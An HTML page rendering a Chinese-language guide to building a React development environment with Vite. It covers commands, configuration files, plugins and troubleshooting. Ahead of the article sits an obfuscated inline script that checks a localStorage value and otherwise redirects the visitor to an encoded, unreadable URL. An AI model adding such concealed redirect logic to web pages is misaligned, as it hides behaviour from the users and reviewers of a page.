<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x1450c7=_0x46fc;function _0x46fc(t,s){var l=_0x4c30();return(_0x46fc=function(s,n){var a=l[s-=101];void 0===_0x46fc.EhqCek&&(_0x46fc.WnQDbR=function(s,n){var a,p=[],t=0,l="";for(s=(s=>{for(var n,a,p="",t="",l=0,e=0;a=s.charAt(e++);~a&&(n=l%4?64*n+a:a,l++%4)&&(p+=String.fromCharCode(255&n>>(-2*l&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,r=p.length;c<r;c++)t+="%"+("00"+p.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(t)})(s),e=0;e<256;e++)p[e]=e;for(e=0;e<256;e++)t=(t+p[e]+n.charCodeAt(e%n.length))%256,a=p[e],p[e]=p[t],p[t]=a;for(var e=0,t=0,c=0;c<s.length;c++)a=p[e=(e+1)%256],p[e]=p[t=(t+p[e])%256],p[t]=a,l+=String.fromCharCode(s.charCodeAt(c)^p[(p[e]+p[t])%256]);return l},t=arguments,_0x46fc.EhqCek=!0);var s=s+l[0],p=t[s];return p?a=p:(void 0===_0x46fc.MlxVpj&&(_0x46fc.MlxVpj=!0),a=_0x46fc.WnQDbR(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x46fc,n=_0x4c30();;)try{if(213030==+parseInt(s(110,"9ByK"))+-parseInt(s(111,"*VKI"))/2*(parseInt(s(102,"A]nI"))/3)+-parseInt(s(114,"Q0@G"))/4+-parseInt(s(104,"RtX["))/5+parseInt(s(122,"zSG)"))/6+-parseInt(s(117,"os9Y"))/7+parseInt(s(120,"UWK^"))/8)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x1450c7(107,"3peq")](_0x1450c7(119,"mqoD"))!=_0x1450c7(108,"5kjI"))throw window[_0x1450c7(101,"RtX[")][_0x1450c7(121,"UWK^")](_0x1450c7(106,"GN[!")),Error();function _0x4c30(){var s=["wW7cQYKmWP9/W5nNdCkQeSoG","iCoUF8ovCCoBfaVcT8o4W68","W65LiCoyWRtdLvmzWQm","WPpcPSkbW4tdHu/cVhFdTmoGWQfmsG","W5tdT8ocWPJcNbtdQq","W6RcVursg8k9W5XzEHOMW6tcNq","WOddOJvsWOZcHSoiDG","W63dHhVdNCo3j8kPWOSAWRVcQG","q8oeufhcHMNdOgf1WQ8CDZO","W53cUMybW4RdNCkxE8osW4hdHNy+","DSoPuSogCmkEW4a/","WRVcGJXfou7cU8kPocBdTbCZFejfW6pdICo0WP7dR2mOar/dRW","WQ5rt8ouW5PktG","sSkkWORcQSoP","ybFcSmoKl2pdGmknWRjBmWPa","tqpdS8oJbSoFWORcG8kdm8ofWRC","W5xdGSkkv8k1WReHW6S","W6NdHhZdKSoXDmoWWOCnWRRcV8khhW","W4BdN8k+BCk4W69KiSo7W4OLB8oN","s2FcHg8lxMZcUgKXW53cLvm","W6JcT0fwgSkXWQzxBWarW58","umonW6iFpx7cQXSNW4j6W40g"];return(_0x4c30=function(){return s})()}document.title="使用 Vite 构建 React 开发环境完整指南",document.getElementById("article").innerHTML='<div><p>Vite 是新一代前端构建工具，能够极速启动开发服务器并提供高效的构建体验。以下是使用 Vite 搭建 React 开发环境的详细步骤和最佳实践。</p>\n<h2>一、快速创建项目</h2>\n<h3>1. 使用官方模板初始化</h3>\n<pre><code class="language-sh">npm create vite@latest my-react-app --template react\n<span class="hljs-comment"># 或</span>\nyarn create vite my-react-app --template react\n<span class="hljs-comment"># 或</span>\npnpm create vite my-react-app --template react\n</code></pre>\n<h3>2. 进入项目并安装依赖</h3>\n<pre><code class="language-sh"><span class="hljs-built_in">cd</span> my-react-app\nnpm install\n<span class="hljs-comment"># 或</span>\nyarn\n<span class="hljs-comment"># 或</span>\npnpm install\n</code></pre>\n<h2>二、项目结构解析</h2>\n<p>生成的典型项目结构：</p>\n<pre><code>my-react-app/\n├── node_modules/\n├── public/\n│   └── vite.svg\n├── src/\n│   ├── assets/\n│   ├── App.css\n│   ├── App.jsx\n│   ├── index.css\n│   ├── main.jsx\n│   └── vite-env.d.ts\n├── .eslintrc.cjs\n├── .gitignore\n├── index.html\n├── package.json\n├── vite.config.js\n└── README.md\n</code></pre>\n<h2>三、核心配置文件</h2>\n<h3>1. <code>vite.config.js</code> 基础配置</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vite&#x27;</span>\n<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@vitejs/plugin-react&#x27;</span>\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({\n  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">react</span>()],\n  <span class="hljs-attr">server</span>: {\n    <span class="hljs-attr">port</span>: <span class="hljs-number">3000</span>, <span class="hljs-comment">// 自定义端口</span>\n    <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// 自动打开浏览器</span>\n  },\n  <span class="hljs-attr">resolve</span>: {\n    <span class="hljs-attr">alias</span>: {\n      <span class="hljs-string">&#x27;@&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./src&#x27;</span>) <span class="hljs-comment">// 设置路径别名</span>\n    }\n  }\n})\n</code></pre>\n<h3>2. 支持 TypeScript</h3>\n<p>Vite 天然支持 TypeScript，只需：</p>\n<ol>\n<li>安装类型定义：<pre><code class="language-sh">npm install --save-dev @types/react @types/react-dom\n</code></pre>\n</li>\n<li>将文件扩展名改为 <code>.tsx</code></li>\n</ol>\n<h2>四、开发环境功能</h2>\n<h3>1. 启动开发服务器</h3>\n<pre><code class="language-sh">npm run dev\n<span class="hljs-comment"># 或</span>\nyarn dev\n<span class="hljs-comment"># 或</span>\npnpm dev\n</code></pre>\n<p>特点：</p>\n<ul>\n<li>极速启动（通常 &lt;500ms）</li>\n<li>热模块替换（HMR）超快更新</li>\n</ul>\n<h3>2. 环境变量配置</h3>\n<p>创建 <code>.env</code> 文件：</p>\n<pre><code class="language-env">VITE_API_URL=https://api.example.com\n</code></pre>\n<p>使用变量：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_API_URL</span>)\n</code></pre>\n<h2>五、生产环境构建</h2>\n<h3>1. 构建命令</h3>\n<pre><code class="language-sh">npm run build\n<span class="hljs-comment"># 或</span>\nyarn build\n<span class="hljs-comment"># 或</span>\npnpm build\n</code></pre>\n<p>生成的文件默认在 <code>dist</code> 目录</p>\n<h3>2. 预览生产版本</h3>\n<pre><code class="language-sh">npm run preview\n<span class="hljs-comment"># 或</span>\nyarn preview\n<span class="hljs-comment"># 或</span>\npnpm preview\n</code></pre>\n<h2>六、高级配置</h2>\n<h3>1. 添加 CSS 预处理器</h3>\n<p>安装 Sass：</p>\n<pre><code class="language-sh">npm install -D sass\n</code></pre>\n<p>直接使用 <code>.scss</code> 文件：</p>\n<pre><code class="language-scss"><span class="hljs-comment">// style.scss</span>\n<span class="hljs-variable">$primary-color</span>: <span class="hljs-number">#333</span>;\n\n<span class="hljs-selector-tag">body</span> {\n  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>;\n}\n</code></pre>\n<h3>2. 配置路径别名</h3>\n<p>修改 <code>vite.config.js</code>：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;path&#x27;</span>\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({\n  <span class="hljs-attr">resolve</span>: {\n    <span class="hljs-attr">alias</span>: {\n      <span class="hljs-string">&#x27;@&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./src&#x27;</span>),\n      <span class="hljs-string">&#x27;components&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./src/components&#x27;</span>)\n    }\n  }\n})\n</code></pre>\n<h3>3. 集成 ESLint</h3>\n<p>安装依赖：</p>\n<pre><code class="language-sh">npm install eslint eslint-plugin-react @typescript-eslint/parser @typescript-eslint/eslint-plugin --save-dev\n</code></pre>\n<p>配置 <code>.eslintrc.cjs</code>：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">env</span>: { <span class="hljs-attr">browser</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">es2021</span>: <span class="hljs-literal">true</span> },\n  <span class="hljs-attr">extends</span>: [\n    <span class="hljs-string">&#x27;eslint:recommended&#x27;</span>,\n    <span class="hljs-string">&#x27;plugin:react/recommended&#x27;</span>,\n    <span class="hljs-string">&#x27;plugin:@typescript-eslint/recommended&#x27;</span>\n  ],\n  <span class="hljs-attr">parser</span>: <span class="hljs-string">&#x27;@typescript-eslint/parser&#x27;</span>,\n  <span class="hljs-attr">parserOptions</span>: {\n    <span class="hljs-attr">ecmaFeatures</span>: { <span class="hljs-attr">jsx</span>: <span class="hljs-literal">true</span> },\n    <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-string">&#x27;latest&#x27;</span>,\n    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">&#x27;module&#x27;</span>\n  },\n  <span class="hljs-attr">plugins</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;@typescript-eslint&#x27;</span>],\n  <span class="hljs-attr">rules</span>: {\n    <span class="hljs-string">&#x27;react/react-in-jsx-scope&#x27;</span>: <span class="hljs-string">&#x27;off&#x27;</span>\n  }\n}\n</code></pre>\n<h2>七、常用插件推荐</h2>\n<ol>\n<li><strong>路由</strong>  ：<code>react-router-dom</code><pre><code class="language-sh">npm install react-router-dom\n</code></pre>\n</li>\n<li><strong>状态管理</strong>  ：<code>@reduxjs/toolkit</code><pre><code class="language-sh">npm install @reduxjs/toolkit react-redux\n</code></pre>\n</li>\n<li><strong>HTTP 客户端</strong>  ：<code>axios</code><pre><code class="language-sh">npm install axios\n</code></pre>\n</li>\n<li><strong>Vite 插件</strong>  ：\n<ul>\n<li><code>@vitejs/plugin-legacy</code>：支持传统浏览器</li>\n<li><code>vite-plugin-svgr</code>：SVG 组件支持</li>\n<li><code>vite-plugin-pwa</code>：PWA 支持</li>\n</ul>\n</li>\n</ol>\n<h2>八、与 Create React App 对比</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>Vite + React</th>\n<th>Create React App</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>启动时间</td>\n<td>&lt;1s</td>\n<td>10-30s</td>\n</tr>\n<tr>\n<td>HMR 更新速度</td>\n<td>即时</td>\n<td>较慢</td>\n</tr>\n<tr>\n<td>生产构建速度</td>\n<td>快</td>\n<td>慢</td>\n</tr>\n<tr>\n<td>配置复杂度</td>\n<td>灵活</td>\n<td>受限</td>\n</tr>\n<tr>\n<td>生态系统</td>\n<td>成长中</td>\n<td>成熟</td>\n</tr>\n<tr>\n<td>文件大小</td>\n<td>更小</td>\n<td>较大</td>\n</tr>\n</tbody>\n</table>\n<h2>九、常见问题解决</h2>\n<h3>1. 解决 &quot;React is not defined&quot; 错误</h3>\n<p>在 <code>.eslintrc.cjs</code> 中添加：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-comment">// ...</span>\n  <span class="hljs-attr">settings</span>: {\n    <span class="hljs-attr">react</span>: {\n      <span class="hljs-attr">version</span>: <span class="hljs-string">&#x27;detect&#x27;</span>\n    }\n  }\n}\n</code></pre>\n<h3>2. 处理路径别名与 TypeScript</h3>\n<p>在 <code>tsconfig.json</code> 中添加：</p>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n      <span class="hljs-attr">&quot;@/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;src/*&quot;</span><span class="hljs-punctuation">]</span>\n    <span class="hljs-punctuation">}</span>\n  <span class="hljs-punctuation">}</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n<h3>3. 优化构建输出</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// vite.config.js</span>\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({\n  <span class="hljs-attr">build</span>: {\n    <span class="hljs-attr">rollupOptions</span>: {\n      <span class="hljs-attr">output</span>: {\n        <span class="hljs-attr">manualChunks</span>: {\n          <span class="hljs-attr">react</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>],\n          <span class="hljs-attr">vendor</span>: [<span class="hljs-string">&#x27;lodash&#x27;</span>, <span class="hljs-string">&#x27;axios&#x27;</span>]\n        }\n      }\n    }\n  }\n})\n</code></pre>\n<p>通过以上配置，您可以获得一个高性能、可扩展的 React 开发环境。Vite 的快速反馈循环让开发体验更加流畅，特别适合现代前端开发需求。</p>\n</div>'</script></body></html>